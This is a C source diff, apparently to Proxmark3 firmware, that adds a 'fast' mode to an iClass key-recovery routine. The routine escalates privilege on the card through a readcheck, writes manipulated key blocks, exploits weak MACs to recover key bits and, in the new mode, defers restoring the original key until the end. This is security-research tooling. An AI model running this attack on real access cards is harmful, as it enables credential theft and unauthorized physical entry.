@@ -2626,7 +2626,7 @@ static void generate_single_key_block_inverted_opt(const uint8_t *startingKey, u
 
     // Start from the second byte, index 1 as we're never gonna touch the first byte
     for (int i = 1; i < PICOPASS_BLOCK_SIZE; i++) {
-        // Clear the last bit of the current byte (AND with 0xFE)
+        // Clear the last three bits of the current byte (AND with 0xF8)
         keyBlock[i] &= 0xF8;
         // Set the last bit to the corresponding value from binary_endings (OR with binary_endings[i])
         keyBlock[i] |= ((binary_mids[i] & 0x03) << 1) | (binary_endings[i] & 0x01);
@@ -2638,6 +2638,9 @@ void iClass_Recover(iclass_recover_req_t *msg) {
     bool shallow_mod = false;
     uint8_t zero_key[PICOPASS_BLOCK_SIZE] = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
     uint8_t genkeyblock[PICOPASS_BLOCK_SIZE] = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
+    uint8_t fast_restore_key[PICOPASS_BLOCK_SIZE] = {0};
+    uint8_t fast_previous_key[PICOPASS_BLOCK_SIZE] = {0};
+    uint8_t fast_current_key[PICOPASS_BLOCK_SIZE] = {0};
     uint32_t index = msg->index;
     int bits_found = -1;
     bool recovered = false;
@@ -2646,8 +2649,7 @@ void iClass_Recover(iclass_recover_req_t *msg) {
     uint8_t div_key2[8] = {0};
     uint32_t eof_time = 0;
     uint32_t start_time = 0;
-    uint8_t read_check_cc[] = { 0x80 | ICLASS_CMD_READCHECK, 0x18 }; //block 24
-    read_check_cc[0] = 0x10 | ICLASS_CMD_READCHECK; //use credit key
+    uint8_t read_check_cc[] = { 0x10 | ICLASS_CMD_READCHECK, 0x18 }; //block 24 with credit key
     uint8_t read_check_cc2[] = { 0x80 | ICLASS_CMD_READCHECK, 0x02 }; //block 2 -> to check Kd macs
 
     /*  iclass_mac_table is a series of weak macs, those weak macs correspond to the different combinations of the last 3 bits of each key byte. */
@@ -2697,6 +2699,9 @@ void iClass_Recover(iclass_recover_req_t *msg) {
             card_select = true;
         }
 
+        //Step 0A - The read_check_cc block has to be in AA2, set it by checking the card configuration
+        read_check_cc[1] = ((uint8_t*)&hdr.conf)[0] + 1; //first block of AA2
+
         //Step1 Authenticate with AA1 using trace
         if (card_select) {
             memcpy(original_mac, msg->req.key, 8);
@@ -2732,6 +2737,9 @@ void iClass_Recover(iclass_recover_req_t *msg) {
                 completed = true;
             } else {
                 interrupted = true;
+            }
+            if(msg->fast){
+                goto fast_restore;
             }
             goto out;
         }
@@ -2778,7 +2786,6 @@ void iClass_Recover(iclass_recover_req_t *msg) {
         }
 
         //Step2 Privilege Escalation: attempt to read AA2 with credentials for AA1
-        uint8_t blockno = 3;
         int priv_esc_tries = 0;
         while (!priv_esc) {
             //The privilege escalation is done with a readcheck and not just a normal read!
@@ -2810,9 +2817,23 @@ void iClass_Recover(iclass_recover_req_t *msg) {
             memcpy(genkeyblock, zero_key, PICOPASS_BLOCK_SIZE);
         }
 
+        if(msg->fast){//if we're skipping restoring the original key to gain speed, xor the new index key with the previous index key and update the difference and track restore values differently
+            if(index > 0 && loops > 1){
+                generate_single_key_block_inverted_opt(zero_key, index -1, fast_previous_key);
+            }else{
+                memcpy(fast_previous_key, zero_key, PICOPASS_BLOCK_SIZE);
+            }
+            for (int i = 0; i < PICOPASS_BLOCK_SIZE; i++) {
+                fast_current_key[i] = genkeyblock[i] ^ fast_previous_key[i];
+                fast_restore_key[i] = fast_restore_key[i] ^ fast_current_key[i];
+            }
+            memcpy(genkeyblock, fast_current_key, PICOPASS_BLOCK_SIZE);
+        }
+
         //Step4 Calculate New Mac
 
         uint8_t wb[9] = {0};
+        uint8_t blockno = 3;
         wb[0] = blockno;
         memcpy(wb + 1, genkeyblock, 8);
         doMAC_N(wb, sizeof(wb), div_key2, mac2);
@@ -2823,31 +2844,36 @@ void iClass_Recover(iclass_recover_req_t *msg) {
             if (iclass_writeblock_sp(blockno, genkeyblock, mac2, shallow_mod, &start_time, &eof_time)) {
                 status_message = 4; //wrote new key on the card - unverified
             }
-            //Reset cypher state
-            start_time = eof_time + DELAY_ICLASS_VICC_TO_VCD_READER;
-            iclass_send_as_reader(read_check_cc2, sizeof(read_check_cc2), &start_time, &eof_time, shallow_mod);
-            //try to authenticate with the original mac to verify the write happened
-            memcpy(msg->req.key, original_mac, 8);
-            start_time = eof_time + DELAY_ICLASS_VICC_TO_VCD_READER;
-            res = authenticate_iclass_tag(&msg->req, &hdr, &start_time, &eof_time, mac1);
-            if (msg->test) {
-                if (res) {
-                    DbpString("");
-                    DbpString(_GREEN_("*** CARD EPURSE IS LOUD! OK TO ATTEMPT KEY RETRIEVAL! RUN AGAIN WITH -notest ***"));
-                    completed = true;
-                    goto out;
+            if(!msg->fast){ //if we're going slow we check at every write that the write actually happened
+                //Reset cypher state
+                start_time = eof_time + DELAY_ICLASS_VICC_TO_VCD_READER;
+                iclass_send_as_reader(read_check_cc2, sizeof(read_check_cc2), &start_time, &eof_time, shallow_mod);
+                //try to authenticate with the original mac to verify the write happened
+                memcpy(msg->req.key, original_mac, 8);
+                start_time = eof_time + DELAY_ICLASS_VICC_TO_VCD_READER;
+                res = authenticate_iclass_tag(&msg->req, &hdr, &start_time, &eof_time, mac1);
+                if (msg->test) {
+                    if (res) {
+                        DbpString("");
+                        DbpString(_GREEN_("*** CARD EPURSE IS LOUD! OK TO ATTEMPT KEY RETRIEVAL! RUN AGAIN WITH -notest ***"));
+                        completed = true;
+                        goto out;
+                    } else {
+                        DbpString("");
+                        DbpString(_RED_("*** CARD EPURSE IS SILENT! RISK OF BRICKING! DO NOT EXECUTE KEY UPDATES! SCAN IT ON READER FOR EPURSE UPDATE, COLLECT NEW TRACES AND TRY AGAIN! ***"));
+                        goto out;
+                    }
                 } else {
-                    DbpString("");
-                    DbpString(_RED_("*** CARD EPURSE IS SILENT! RISK OF BRICKING! DO NOT EXECUTE KEY UPDATES! SCAN IT ON READER FOR EPURSE UPDATE, COLLECT NEW TRACES AND TRY AGAIN! ***"));
-                    goto out;
+                    if (res) {
+                        write_error = true; //failed to update the key, the card's key is the original one
+                    } else {
+                        status_message = 5; //verified the card key was updated to the new one
+                        written = true;
+                    }
                 }
-            } else {
-                if (res) {
-                    write_error = true; //failed to update the key, the card's key is the original one
-                } else {
-                    status_message = 5; //verified the card key was updated to the new one
-                    written = true;
-                }
+            }else{ //if we're going fast we can skip the above checks as we're just xorring the key over and over
+                status_message = 5;
+                written = true;
             }
         }
 
@@ -2866,45 +2892,48 @@ void iClass_Recover(iclass_recover_req_t *msg) {
                 }
             }
 
-            //regardless of bits being found, restore the original key and verify it
             bool reverted = false;
             uint8_t revert_retries = 0;
-            while (reverted == false) {
-                //Regain privilege escalation with a readcheck
-                start_time = eof_time + DELAY_ICLASS_VICC_TO_VCD_READER;
-                iclass_send_as_reader(read_check_cc, sizeof(read_check_cc), &start_time, &eof_time, shallow_mod);
-                // TODO: check result
-                //GetIso15693AnswerFromTag(resp, sizeof(resp), ICLASS_READER_TIMEOUT_OTHERS, &eof_time, false, true, &resp_len);
-                start_time = eof_time + DELAY_ICLASS_VICC_TO_VCD_READER;
-                if (iclass_writeblock_sp(blockno, genkeyblock, mac2, shallow_mod, &start_time, &eof_time)) {
-                    status_message = 6; //restore of original key successful but unverified
+            if(msg->fast){ //if we're going fast only restore the original key at the end
+                if(recovered){
+                    goto fast_restore;
                 }
-                //Do a readcheck first to reset the cypher state
-                start_time = eof_time + DELAY_ICLASS_VICC_TO_VCD_READER;
-                iclass_send_as_reader(read_check_cc2, sizeof(read_check_cc2), &start_time, &eof_time, shallow_mod);
-                // TODO: check result
-                //GetIso15693AnswerFromTag(resp, sizeof(resp), ICLASS_READER_TIMEOUT_OTHERS, &eof_time, false, true, &resp_len);
-                //need to craft the authentication payload accordingly
-                memcpy(msg->req.key, original_mac, 8);
-                start_time = eof_time + DELAY_ICLASS_VICC_TO_VCD_READER;
-                res = authenticate_iclass_tag(&msg->req, &hdr, &start_time, &eof_time, mac1);
-                if (res == true) {
-                    status_message = 7; //restore of original key verified - card usable again
-                    reverted = true;
-                    if (recovered) {
-                        goto restore;
+            }else{
+                //if we're NOT going fast, regardless of bits being found, restore the original key and verify it
+                while (!reverted) {
+                    //Regain privilege escalation with a readcheck
+                    start_time = eof_time + DELAY_ICLASS_VICC_TO_VCD_READER;
+                    iclass_send_as_reader(read_check_cc, sizeof(read_check_cc), &start_time, &eof_time, shallow_mod);
+                    start_time = eof_time + DELAY_ICLASS_VICC_TO_VCD_READER;
+                    if (iclass_writeblock_sp(blockno, genkeyblock, mac2, shallow_mod, &start_time, &eof_time)) {
+                        status_message = 6; //restore of original key successful but unverified
+                    }
+                    //Do a readcheck first to reset the cypher state
+                    start_time = eof_time + DELAY_ICLASS_VICC_TO_VCD_READER;
+                    iclass_send_as_reader(read_check_cc2, sizeof(read_check_cc2), &start_time, &eof_time, shallow_mod);
+                    //need to craft the authentication payload accordingly
+                    memcpy(msg->req.key, original_mac, 8);
+                    start_time = eof_time + DELAY_ICLASS_VICC_TO_VCD_READER;
+                    res = authenticate_iclass_tag(&msg->req, &hdr, &start_time, &eof_time, mac1);
+                    if (res == true) {
+                        status_message = 7; //restore of original key verified - card usable again
+                        reverted = true;
+                        if (recovered) {
+                            goto restore;
+                        }
+                    }
+
+                    revert_retries++;
+                    if (revert_retries >= 7) { //must always be an odd number!
+                        DbpString("");
+                        DbpString(_CYAN_("Last Written Key: "));
+                        Dbhexdump(8, genkeyblock, false);
+                        Dbprintf(_RED_("Attempted to restore original key for %3d times and failed. Stopping. Card is likely unusable."), revert_retries);
+                        goto out;
                     }
                 }
-
-                revert_retries++;
-                if (revert_retries >= 7) { //must always be an odd number!
-                    DbpString("");
-                    DbpString(_CYAN_("Last Written Key: "));
-                    Dbhexdump(8, genkeyblock, false);
-                    Dbprintf(_RED_("Attempted to restore original key for %3d times and failed. Stopping. Card is likely unusable."), revert_retries);
-                    goto out;
-                }
             }
+
 
         }
 
@@ -2947,13 +2976,59 @@ void iClass_Recover(iclass_recover_req_t *msg) {
 
     }//end while
 
+fast_restore:
+    ;//empty statement for compilation
+    uint8_t mac2[4] = {0};
+    uint8_t wb[9] = {0};
+    uint8_t blockno = 3;
+    wb[0] = blockno;
+    bool reverted = false;
+    uint8_t revert_retries = 0;
+    while (!reverted) {
+        //Regain privilege escalation with a readcheck
+        start_time = eof_time + DELAY_ICLASS_VICC_TO_VCD_READER;
+        iclass_send_as_reader(read_check_cc, sizeof(read_check_cc), &start_time, &eof_time, shallow_mod);
+        memcpy(wb + 1, fast_restore_key, 8);
+        doMAC_N(wb, sizeof(wb), div_key2, mac2);
+        start_time = eof_time + DELAY_ICLASS_VICC_TO_VCD_READER;
+        if (iclass_writeblock_sp(blockno, fast_restore_key, mac2, shallow_mod, &start_time, &eof_time)) {
+            status_message = 6; //restore of original key successful but unverified
+        }
+        //Do a readcheck first to reset the cypher state
+        start_time = eof_time + DELAY_ICLASS_VICC_TO_VCD_READER;
+        iclass_send_as_reader(read_check_cc2, sizeof(read_check_cc2), &start_time, &eof_time, shallow_mod);
+        //need to craft the authentication payload accordingly
+        memcpy(msg->req.key, original_mac, 8);
+        start_time = eof_time + DELAY_ICLASS_VICC_TO_VCD_READER;
+        res = authenticate_iclass_tag(&msg->req, &hdr, &start_time, &eof_time, mac1);
+        if (res == true) {
+            status_message = 7; //restore of original key verified - card usable again
+            reverted = true;
+        }
+        revert_retries++;
+        if (revert_retries >= 7) { //must always be an odd number!
+            DbpString("");
+            DbpString(_CYAN_("Last Written Key (fast): "));
+            Dbhexdump(8, fast_restore_key, false);
+            Dbprintf(_RED_("Attempted to restore original key for %3d times and failed. Stopping. Card is likely unusable."), revert_retries);
+        }
+        if(recovered){
+            goto restore;
+        }else{
+            goto out;
+        }
+    }
 
 restore:
     ;//empty statement for compilation
     uint8_t partialkey[PICOPASS_BLOCK_SIZE] = {0};
 
     for (int i = 0; i < PICOPASS_BLOCK_SIZE; i++) {
-        partialkey[i] = genkeyblock[i] ^ bits_found;
+        if(msg->fast){
+            partialkey[i] = fast_restore_key[i] ^ bits_found;
+        }else{
+            partialkey[i] = genkeyblock[i] ^ bits_found;
+        }
     }
 
     //Print the bits decimal value
